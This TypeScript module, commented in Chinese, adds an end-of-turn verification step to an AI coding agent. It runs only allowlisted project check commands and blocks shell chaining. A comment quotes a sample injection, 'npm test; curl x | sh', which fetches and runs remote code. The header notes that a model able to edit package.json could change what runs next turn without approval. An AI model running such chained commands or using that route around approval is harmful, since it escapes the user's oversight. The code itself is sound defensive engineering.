import { execSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import type { Wire } from '../engine/wire.ts';

/**
 * 自动验证：模型说"改好了"之后，跑一次**项目自己的**检查命令，不通过就把错误喂回去让它修。
 *
 * 为什么需要：现在写文件的反馈只有"写入成功"。模型宣称改好了就算改好了，
 * 没有任何机械证据——而这正是 Claude Code / Codex 那类工具的核心闭环
 * （改 → 自动跑 lint/typecheck/test → 失败自修）。
 * 这个项目已经有过同一个思路的实现：wiki 的 `verifyBody`（生成完机械回溯原文核对数字）。
 * 这里是把它从"文档"推广到"代码"。
 *
 * 三条刻意的约束：
 *
 * 1. **回合末跑一次，不是每次编辑后跑。** 每改一行跑一遍全量测试，在真实项目里是几分钟。
 *    回合末一次更接近"提交前跑测试"，反馈路径一样，代价只是错误发现得晚一点。
 * 2. **命令不由模型指定。** 只从 `package.json` 的 scripts 或 `.glassbox/verify.json` 里取。
 *    如果让模型自己给命令，等于给了它一条绕过审批执行任意命令的通道。
 * 3. **命令在回合开始时就定下来。** 模型在本回合里改了 package.json 也不影响这一回合跑什么。
 *
 * 必须说清的残留风险：**没有沙箱**。模型能写 `package.json`，也就能改下一回合要执行的命令。
 * 白名单（只允许单条、已知的构建/测试命令，不许拼接）把门槛抬高了，但没有消除风险。
 * 真正的解法是把执行放进容器，那是另一件事。
 */

export interface VerifySpec {
  cmd: string;
  timeoutMs: number;
  /** 这条命令是哪儿来的，事件里要显示——"它凭什么跑这个"必须看得见 */
  from: string;
}

export interface VerifyOutcome {
  ok: boolean;
  cmd: string;
  ms: number;
  /** 合并后的 stdout+stderr，已截断 */
  output: string;
}

/** 按这个顺序找第一个存在的 script：显式的 verify 优先，然后是快的（类型检查）再到慢的 */
const SCRIPT_ORDER = ['verify', 'typecheck', 'test', 'lint'] as const;

/**
 * 命令白名单：只允许**单条**已知的构建/测试命令。
 * 拼接符（; && || | 反引号 $()）一律拒绝——否则 `npm test; curl x | sh` 就成了执行通道。
 */
const ALLOWED_HEAD = /^(npm|pnpm|yarn|npx|node|cargo|go|make|gradle|mvn|python[0-9.]*|pytest|tsc|deno|bun)\b/;
const FORBIDDEN = /[;&|`]|\$\(|\n/;

export function commandAllowed(cmd: string): boolean {
  const c = cmd.trim();
  if (!c || FORBIDDEN.test(c)) return false;
  return ALLOWED_HEAD.test(c);
}

/**
 * 找出这个工作区该跑什么。找不到就返回 undefined——**不猜**。
 * 猜错的代价是每回合白跑一条命令，或者更糟：跑了个改状态的命令。
 */
export function detectVerify(workspace: string): VerifySpec | undefined {
  // 1) 显式配置优先
  const cfgPath = path.join(workspace, '.glassbox', 'verify.json');
  if (fs.existsSync(cfgPath)) {
    try {
      const cfg = JSON.parse(fs.readFileSync(cfgPath, 'utf8')) as { cmd?: unknown; timeoutMs?: unknown };
      const cmd = typeof cfg.cmd === 'string' ? cfg.cmd.trim() : '';
      if (cmd && commandAllowed(cmd)) {
        return { cmd, timeoutMs: Number(cfg.timeoutMs) || 120_000, from: '.glassbox/verify.json' };
      }
    } catch {
      // 配置坏了就当没有：这里不该抛，验证不是核心链路
    }
  }
  // 2) package.json scripts
  const pkgPath = path.join(workspace, 'package.json');
  if (fs.existsSync(pkgPath)) {
    try {
      const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8')) as { scripts?: Record<string, string> };
      for (const name of SCRIPT_ORDER) {
        if (pkg.scripts?.[name]) {
          return { cmd: `npm run ${name} --silent`, timeoutMs: 120_000, from: `package.json scripts.${name}` };
        }
      }
    } catch {
      /* 同上 */
    }
  }
  return undefined;
}

/** 输出截断：头尾都留。测试框架的失败摘要通常在末尾，只留开头等于什么都没留 */
export function clipOutput(s: string, head = 1200, tail = 800): string {
  const t = s.trim();
  if (t.length <= head + tail) return t;
  return `${t.slice(0, head)}\n…（中间省略 ${t.length - head - tail} 字符）…\n${t.slice(-tail)}`;
}

export function runVerify(spec: VerifySpec, workspace: string): VerifyOutcome {
  const t0 = Date.now();
  try {
    const out = execSync(spec.cmd, {
      cwd: workspace,
      encoding: 'utf8',
      timeout: spec.timeoutMs,
      stdio: ['ignore', 'pipe', 'pipe'],
    });
    return { ok: true, cmd: spec.cmd, ms: Date.now() - t0, output: clipOutput(out || '(无输出)') };
  } catch (e) {
    const err = e as { stdout?: string; stderr?: string; message?: string; signal?: string };
    // 超时被 kill 时 execSync 抛的是信号错误，stdout/stderr 可能是空的，得把 message 也带上
    const merged = [err.stdout ?? '', err.stderr ?? '', err.signal ? `（超时被终止：${err.signal}）` : '']
      .filter(Boolean)
      .join('\n');
    return {
      ok: false,
      cmd: spec.cmd,
      ms: Date.now() - t0,
      output: clipOutput(merged || err.message || '命令失败但没有输出'),
    };
  }
}

/** Loop 只依赖这个形状，方便测试时塞一个假的进去 */
export interface TurnVerifier {
  /** 本回合成功调用过的工具名 → 要不要验证 */
  needed(usedTools: readonly string[]): boolean;
  /** 跑一次。返回 undefined = 没跑（没有可用命令） */
  run(turnId: string): Promise<VerifyOutcome | undefined>;
}

/** 哪些工具算"动过文件"。run_command 也可能改文件，但那太宽，一期只认明确的写工具 */
const WRITE_TOOLS = new Set(['write_file', 'edit_file']);

export class Verifier implements TurnVerifier {
  private readonly workspace: string;
  private readonly wire: Wire;
  /** 回合开始（构造）时就定下来，模型中途改 package.json 不影响本回合 */
  readonly spec: VerifySpec | undefined;

  constructor(workspace: string, wire: Wire, spec?: VerifySpec) {
    this.workspace = workspace;
    this.wire = wire;
    this.spec = spec ?? detectVerify(workspace);
  }

  needed(usedTools: readonly string[]): boolean {
    return !!this.spec && usedTools.some((t) => WRITE_TOOLS.has(t));
  }

  async run(turnId: string): Promise<VerifyOutcome | undefined> {
    if (!this.spec) return undefined;
    this.wire.emit({ type: 'verify.started', turnId, cmd: this.spec.cmd, from: this.spec.from, ts: Date.now() });
    const out = runVerify(this.spec, this.workspace);
    this.wire.emit({
      type: 'verify.done',
      turnId,
      cmd: out.cmd,
      ok: out.ok,
      ms: out.ms,
      output: out.output,
      ts: Date.now(),
    });
    return out;
  }
}
